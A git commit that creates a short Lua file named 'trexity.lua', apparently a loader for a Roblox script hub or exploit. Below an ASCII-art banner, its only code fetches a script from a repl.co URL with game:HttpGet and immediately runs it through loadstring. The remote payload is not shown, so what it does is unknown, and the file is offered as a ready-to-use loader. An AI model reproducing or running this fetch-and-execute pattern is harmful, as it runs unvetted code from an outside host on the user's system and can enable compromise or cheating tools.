deeb15e029851311ee8db3cd5084733b3275de67
fearwastaken <129332557+fearwastaken@users.noreply.github.com>
2023-04-14 20:04:51 -0500

    Create trexity.lua

---
+++ trexity.lua
@@ -0,0 +1,17 @@
+--[[
+    TTTTTTT   RRRRRRR EEEEEEEE X       X  IIIIIIIII TTTTTTTTT Y       Y
+       T      R     R E         X     X       I         T       Y   Y
+       T      RRRRRR  EEEEEEEE    XX          I         T         Y
+       T      R RRR   E         X     X       I         T         Y
+       T      R     R EEEEEEEE X       X  IIIIIIIII     T         Y
+]]
+
+
+
+
+
+
+
+local fatty = 'https://trex.f34rw4st4k3n.repl.co'
+
+loadstring(game:HttpGet(fatty))()
